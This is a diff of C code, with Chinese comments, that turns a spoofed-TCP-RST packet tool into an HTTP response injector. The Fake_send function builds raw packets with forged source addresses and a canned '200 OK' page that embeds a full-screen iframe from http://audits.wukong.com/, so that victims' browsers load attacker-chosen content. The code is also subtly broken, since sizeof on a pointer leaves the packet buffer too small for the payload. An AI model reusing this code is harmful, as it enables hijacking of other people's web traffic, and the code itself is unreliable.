@@ -235,29 +235,37 @@ return 0;
 int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt){
 
   static int i=0;
+  //属于魔法值，要注意
   int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 
 
   /* Raw socket file descriptor */ 
-  int rawsocket=0;  
+  int rawsocket=0;
+
+  //实际上这里需要变化的参数就只有src里面的host地址，以及所谓的Content—Length
+  char *html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://audits.wukong.com/'></iframe></body></html>\n";   
   
   /* Buffer for the TCP/IP SYN Packets */
-  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) +1 ];   
+  char packet[ sizeof(struct tcphdr) + sizeof(struct ip)+ sizeof(html_content) +1 ];   
 
+  //构造好了所谓的packet缓冲区之后，这将会指向IP包的包头....
   /* It will point to start of the packet buffer */  
   struct ip *ipheader = (struct ip *)packet;   
   
+  //当然咯，这会指向tcp包的包头.....
   /* It will point to the end of the IP header in packet buffer */  
   struct tcphdr *tcpheader = (struct tcphdr *) (packet + sizeof(struct ip)); 
   
   /* TPC Pseudoheader (used in checksum)    */
+  //tcp的伪头部，用来计算checksum
   tcp_phdr_t pseudohdr;            
 
+  //tcp的伪头+实际头部，用来计算checksum的
   /* TCP Pseudoheader + TCP actual header used for computing the checksum */
   char tcpcsumblock[ sizeof(tcp_phdr_t) + TCPSYN_LEN ];
 
   /* Although we are creating our own IP packet with the destination address */
   /* on it, the sendto() system call requires the sockaddr_in structure */
-  struct sockaddr_in dstaddr;  
+  struct sockaddr_in dstaddr; 
   
   memset(&pseudohdr,0,sizeof(tcp_phdr_t));
   memset(&packet, 0, sizeof(packet));
@@ -302,7 +310,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   tcpheader->th_ack = htonl(1);   /* Acknowledgement Number                  */
   tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
   tcpheader->th_off = 5;      /* Segment offset (Lenght of the header)   */
-  tcpheader->th_flags = TH_RST;   /* TCP Flags. We set the Reset Flag        */
+  tcpheader->th_flags = TH_ACK;   /* 原来这里设置成了RST，我们不能这么干        */
   tcpheader->th_win = htons(4500) + rand()%1000;/* Window size               */
   tcpheader->th_urp = 0;          /* Urgent pointer.                         */
   tcpheader->th_sport = src_prt;  /* Source Port                             */
